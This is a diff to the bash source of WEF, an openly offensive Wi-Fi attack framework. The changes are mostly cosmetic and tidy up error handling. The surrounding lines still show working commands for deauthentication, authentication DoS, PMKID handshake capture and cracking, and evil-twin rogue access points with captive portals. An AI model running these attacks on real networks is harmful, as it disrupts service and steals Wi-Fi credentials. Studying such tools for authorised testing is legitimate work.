@@ -1,11 +1,11 @@
 #!/bin/bash
 
 #
-# WEF - Wi-Fi Exploitation Framework
-# Discord: @D3Ext
+# WEF - WiFi Exploitation Framework
+# Discord: @d3ext
 # Website: https://d3ext.github.io/
 # Mail: <d3ext@proton.me>
-# Github(s): https://github.com/D3Ext and https://github.com/ultrazar
+# Github: https://github.com/D3Ext
 #
 
 # Check dependencies to work with the least possible tools
@@ -453,6 +453,8 @@ function keep_exit(){
     echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}s${blueC}) o volver al menu (${yC}n${blueC})? : ${endC}" && read exit_status
   fi
 
+  ctrl_c_pressed="true"
+
   # If input is y or yes exit from the function
   if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
     ctrl_c
@@ -555,7 +557,7 @@ function banner(){
   echo -e "${yC}██╗    ██╗███████╗███████╗"
   echo -e "██║    ██║██╔════╝██╔════╝               "
   echo -e "██║ █╗ ██║█████╗  █████╗                 "
-  echo -e "██║███╗██║██╔══╝  ██╔══╝        ${blueC}Wi-Fi Exploitation Framework ${yC}${program_version}"
+  echo -e "██║███╗██║██╔══╝  ██╔══╝        ${blueC}WiFi Exploitation Framework ${yC}${program_version}"
   echo -e "╚███╔███╔╝███████╗██║                    "
   echo -e " ╚══╝╚══╝ ╚══════╝╚═╝${endC}"
 }
@@ -749,7 +751,7 @@ function help_panel(){
   echo -e " \ \    / / __| __|"
   echo -e "  \ \/\/ /| _|| _| "
   echo -e "   \_/\_/ |___|_|  "
-  echo -e "\n${blueC}[${yC}WEF${blueC}] Wi-Fi Exploitation Framework ${yC}${program_version}${endC}"
+  echo -e "\n${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}${endC}"
 
   list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
   if [ "$lang" == "en" ]; then
@@ -880,13 +882,13 @@ function evil_twin_panel() {
   if [ "$lang" == "en" ]; then
     color_output "1" "Rogue AP + Captive Portal"
     color_output "2" "Rogue AP + Captive Portal + DoS"
-    color_output "3" "Rogue AP + Captive Portal + Wi-Fi Enterprise"
-    color_output "4" "Rogue AP + Captive Portal + Wi-Fi Enterprise + DoS"
+    color_output "3" "Rogue AP + Captive Portal + WiFi Enterprise"
+    color_output "4" "Rogue AP + Captive Portal + WiFi Enterprise + DoS"
   else
     color_output "1" "Rogue AP + Portal Cautivo"
     color_output "2" "Rogue AP + Portal Cautivo + DoS"
-    color_output "3" "Rogue AP + Portal Cautivo + Wi-Fi Enterprise"
-    color_output "4" "Rogue AP + Portal Cautivo + Wi-Fi Enterprise + DoS"
+    color_output "3" "Rogue AP + Portal Cautivo + WiFi Enterprise"
+    color_output "4" "Rogue AP + Portal Cautivo + WiFi Enterprise + DoS"
   fi
 }
 
@@ -1044,7 +1046,7 @@ function ask_to_capture_handshakes(){
     cap_name=$(date +"%Y-%m-%d-%H-%M-%S")
 
     if [ ! -d "/opt/wef/main/captures" ]; then
-      mkdir "/opt/wef/main/captures"
+      mkdir "/opt/wef/main/captures" 2>/dev/null
     fi
 
     if [ "$kill_network_services" == "true" ]; then
@@ -1230,7 +1232,7 @@ function ask_dict(){
 
 function write_informative_log(){
   if [ ! -d "/opt/wef/main/logs" ]; then
-    mkdir "/opt/wef/main/logs"
+    mkdir "/opt/wef/main/logs" 2>/dev/null
   fi
 
   if [ ! -f "/opt/wef/main/logs/${essid}.log" ]; then
@@ -1275,7 +1277,7 @@ function write_informative_log(){
 
   # Log file format
   if [ "$lang" == "en" ]; then
-    echo -e "[WEF] Wi-Fi Exploitation Framework
+    echo -e "[WEF] WiFi Exploitation Framework
 ---------------------------------
 Attack date: ${actual_date}
 Attack type: ${type_of_attack}
@@ -1285,7 +1287,7 @@ Attack duration: ${attack_time}
 AP channel: ${channel}
 ---------------------------------\n" >> "/opt/wef/main/logs/${essid}.log" 2>/dev/null
   else
-    echo -e "[WEF] Wi-Fi Exploitation Framework
+    echo -e "[WEF] WiFi Exploitation Framework
 ---------------------------------
 Fecha del ataque: ${actual_date}
 Tipo de ataque: ${type_of_attack}
@@ -1309,27 +1311,6 @@ function parse_info(){
     cap_name="$(date +"%Y-%m-%d-%H-%M-%S")"
   fi
 }
-
-#function parse_info_by_bssid(){
-#  aps="$(cat /opt/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
-#
-#  if [ -f "/opt/wef/cache/airodump-01.csv" ] && [ "$(echo "${aps}" | grep "${ap_bssid}")" ]; then
-#    number="$(echo "${aps}" | grep -n "${ap_bssid}" | awk '{print $1}' FS=":")"
-#    essid=$(echo "${aps}" | sed "${number}q;d" | awk '{print $9}')
-#    channel=$(echo "${aps}" | sed "${number}q;d" | awk '{print $2}')
-#  fi
-#}
-
-#function parse_client_info(){
-#  clients="$(cat /opt/wef/cache/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
-#  clients_length="$(echo "${clients}" | wc -l)"
-
-#  if [ -f "/opt/wef/cache/airodump-01.csv" ] && [[ $client_number -le $clients_length ]]; then
-#    ap_bssid=$(echo "${clients}" | sed "${client_number}q;d" | awk '{print $NF}')
-#    parse_info_by_bssid # parse channel, essid and number (channel required in order to deauth using aireplay-ng)
-#    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
-#  fi
-#}
 
 function parse_info_wps(){
   channel=$(cat /opt/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $2}')
@@ -1360,12 +1341,6 @@ function get_vendor_from_mac(){
       if [ "${vendor}" ]; then
         echo "${vendor}"
       else
-        #mac_4="$(echo "${mac_to_identify%????}")" # 00:C0:CA:B0:2
-        #vendor="$(echo "${macs_info}" | jq -r '.[] | select(.macPrefix == "'"${mac_4}"'") | .vendorName' 2>/dev/null)"
-
-        #if [ "${vendor}" ]; then
-          #echo "${vendor}"
-        #fi
         echo "unknown"
       fi
     fi
@@ -2357,7 +2332,7 @@ function deauth_all_clients(){
   ask_packets
   if [ "$packets_to_send" == "back" ]; then
     if [ "$c_h" == "true" ]; then
-      kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+      kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
     fi
     return
   fi; sleep 0.1
@@ -2372,7 +2347,7 @@ function deauth_all_clients(){
     progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C para pararlo"
   fi
 
-  iw dev ${netCard} set channel ${channel} # Configure the interface on the same channel
+  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
   sleep 0.2
 
   if [ "$verbose" == "false" ]; then
@@ -2389,7 +2364,7 @@ function deauth_all_clients(){
     else
       progress_bar 4 2.5 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
     fi
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     move_capture_files
     check_captured_handshakes
@@ -2431,7 +2406,7 @@ function deauth_one_client(){
     press_enter "Presiona [Enter] para dejar de escanear dispositivos y continuar "
   fi; echo
 
-  kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+  kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
   format_csv_clients_info
 
@@ -2471,7 +2446,7 @@ function deauth_one_client(){
   press_enter_attack
   echo
 
-  iw dev ${netCard} set channel ${channel} # Configure the interface on the same channel
+  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
   if [ "$lang" == "en" ]; then
     progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C to stop it"
   else
@@ -2492,7 +2467,7 @@ function deauth_one_client(){
     else
       progress_bar 4 2.2 "*" "Esperando mientras el cliente se reconecta al AP para capturar su handshake"
     fi
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     move_capture_files
     check_captured_handshakes
@@ -2609,7 +2584,7 @@ function authentication_attack(){
     progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl + C para pararlo"
   fi
 
-  iw dev ${netCard} set channel ${channel} # Configure the interface on the same channel
+  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
 
   if [ "$verbose" == "false" ]; then
     mdk4 ${netCard} a -i ${ap_bssid} &>/dev/null &
@@ -2630,7 +2605,7 @@ function authentication_attack(){
       progress_bar 4 2.2 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
     fi
 
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     move_capture_files
     check_captured_handshakes
@@ -2685,7 +2660,7 @@ function beacon_flood_attack(){
     progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl + C para pararlo"
   fi
 
-  iw dev ${netCard} set channel ${channel} # Configure the interface on the same channel
+  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
   sleep 0.2
 
   if [ ! "$beacon_option" ] && [ "$verbose" == "false" ]; then
@@ -2964,7 +2939,7 @@ function arp_replay_attack(){
   echo
   if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
     sleep 0.5
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     move_capture_files
     log_capture_files
@@ -3022,7 +2997,7 @@ function hirte_attack(){
   echo
   if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
     sleep 0.5
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     echo
     move_capture_files
@@ -3081,7 +3056,7 @@ function caffe_latte_attack(){
   echo
   if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
     sleep 0.5
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     echo
     move_capture_files
@@ -3142,7 +3117,7 @@ function fake_authentication_attack(){
   echo
   if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
     sleep 0.5
-    kill -9 ${airodump_PID}; wait ${airodump_PID} 2>/dev/null
+    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
 
     echo
     move_capture_files
@@ -3264,44 +3239,48 @@ function pmkid_attack(){
 
   check_and_create "/opt/wef/main/captures/${essid}"
 
-  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/opt/wef/main/captures/${essid}/pmkid_capture.pcapng" | grep -v "bye-bye" &
+  file_date="$(date +"%Y-%m-%d-%H-%M-%S")"
+  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng" | grep -v "bye-bye" &
   hcx_PID=$!
   sleep "${attack_time}"
   kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
   sleep 0.5
 
-  echo
-  if [ "$lang" == "en" ]; then
-    progress_bar 2 0.3 "*" "Extracting hashes from /opt/wef/main/captures/${essid}/pmkid_capture.pcapng"
-  else
-    progress_bar 2 0.3 "*" "Extrayendo hashes de /opt/wef/main/captures/${essid}/pmkid_capture.pcapng"
-  fi
-  sleep 0.8 # Let the user read
-
-  if [ "$verbose" == "false" ]; then
-    hcxpcapngtool -o "/opt/wef/main/captures/${essid}/mixed_hashes.txt" "/opt/wef/main/captures/${essid}/pmkid_capture.pcapng" &>/dev/null
-  elif [ "$verbose" == "true" ]; then
+  if [ ! "${ctrl_c_pressed}" ]; then
     echo
-    hcxpcapngtool -o "/opt/wef/main/captures/${essid}/mixed_hashes.txt" "/opt/wef/main/captures/${essid}/pmkid_capture.pcapng"
-  fi; sleep 1
-
-  if [ -f "/opt/wef/main/captures/${essid}/mixed_hashes.txt" ]; then
     if [ "$lang" == "en" ]; then
-      progress_bar 2 0.2 "*" "Filtering hashes of target AP"
+      color_output "*" "Extracting hashes from /opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
     else
-      progress_bar 2 0.2 "*" "Filtrando hashes del AP objetivo"
+      color_output "*" "Extrayendo hashes de /opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
     fi
+    sleep 1.2 # Let the user read
 
     if [ "$verbose" == "false" ]; then
-      hcxhashtool -o "/opt/wef/main/captures/${essid}/pmkid_hashes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/mixed_hashes.txt" &>/dev/null
+      hcxpcapngtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng" &>/dev/null
     elif [ "$verbose" == "true" ]; then
-      hcxhashtool -o "/opt/wef/main/captures/${essid}/pmkid_hashes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/mixed_hashes.txt"
-    fi; sleep 0.2
+      echo
+      hcxpcapngtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
+    fi; sleep 1
+  fi
+
+  if [ ! "${ctrl_c_pressed}" ]; then
+    if [ -f "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" ]; then
+      if [ "$lang" == "en" ]; then
+        progress_bar 2 0.2 "*" "Filtering target AP hashes"
+      else
+        progress_bar 2 0.2 "*" "Filtrando hashes del AP objetivo"
+      fi
+
+      if [ "$verbose" == "false" ]; then
+        hcxhashtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" &>/dev/null
+      elif [ "$verbose" == "true" ]; then
+        hcxhashtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt"
+      fi; sleep 0.2
+    fi
   fi
 
   # Re-enable monitor mode (with airmon-ng)
   ip link set ${oldCard} down 2>/dev/null
-  #iwconfig ${oldCard} mode managed &>/dev/null
   iw ${oldCard} set type managed 2>/dev/null
   ip link set ${oldCard} up 2>/dev/null
   airmon-ng start ${oldCard} &>/dev/null
@@ -3310,14 +3289,14 @@ function pmkid_attack(){
   log_completed
   create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
 
-  if [ -f "/opt/wef/main/captures/${essid}/pmkid_hashes.txt" ]; then
+  if [ -f "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" ]; then
     if [ "$lang" == "en" ]; then
-      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/pmkid_hashes.txt" | awk '{print $1}')
-      color_output "*" "${handshake_total} handshakes written to /opt/wef/main/captures/${essid}/pmkid_hashes.txt"
+      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes written to /opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
       color_output_no_line "*" "Do you want to crack the PMKID handshakes? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
     else
-      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/pmkid_hashes.txt" | awk '{print $1}')
-      color_output "*" "${handshake_total} handshakes almacenados en /opt/wef/main/captures/${essid}/pmkid_hashes.txt"
+      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes almacenados en /opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
       color_output_no_line "*" "¿Quieres crackear los handshakes PMKID? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
     fi
 
@@ -3330,7 +3309,7 @@ function pmkid_attack(){
   fi
   
   if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
-    crack_pmkid_handshakes "/opt/wef/main/captures/${essid}/pmkid_hashes.txt"
+    crack_pmkid_handshakes "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
   elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
     ctrl_c
   else
@@ -3344,7 +3323,7 @@ function pmkid_attack(){
 function inhibitor(){
   trap inhibition_c INT # Change Ctrl + C keyboard interrupt function
 
-  iw dev ${netCard} set channel ${channel} # Configure the interface on the same channel
+  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
 
   if [ "$lang" == "en" ]; then
     progress_bar 2 0.2 "*" "Starting inhibition process"
@@ -3451,7 +3430,8 @@ function create_lighttpd_conf(){
 	echo -e "server.error-handler-404 = \"/\"\n"
 	echo -e "mimetype.assign = ("
 	echo -e "  \".css\" => \"text/css\","
-	echo -e "  \".js\" => \"text/javascript\""
+	echo -e "  \".js\" => \"text/javascript\","
+  echo -e "  \".html\" => \"text/html\""
 	echo -e ")\n"
 	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
 	} >> "/opt/wef/cache/lighttpd.conf"
@@ -3835,7 +3815,8 @@ ignore_broadcast_ssid=0" >> /opt/wef/cache/hostapd-wpe.conf
 
   # Deauth
   if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
-    iw dev mon${netCard} set channel ${channel} 2>/dev/null; sleep 0.1
+    iw dev mon${netCard} set channel ${channel} 2>/dev/null
+    sleep 0.1
 
     if [ "${kill_network_services}" == "true" ]; then
       xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Deauth" -xrm 'XTerm*selectToClipboard: true' -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} mon${evilCard}" 2>/dev/null &
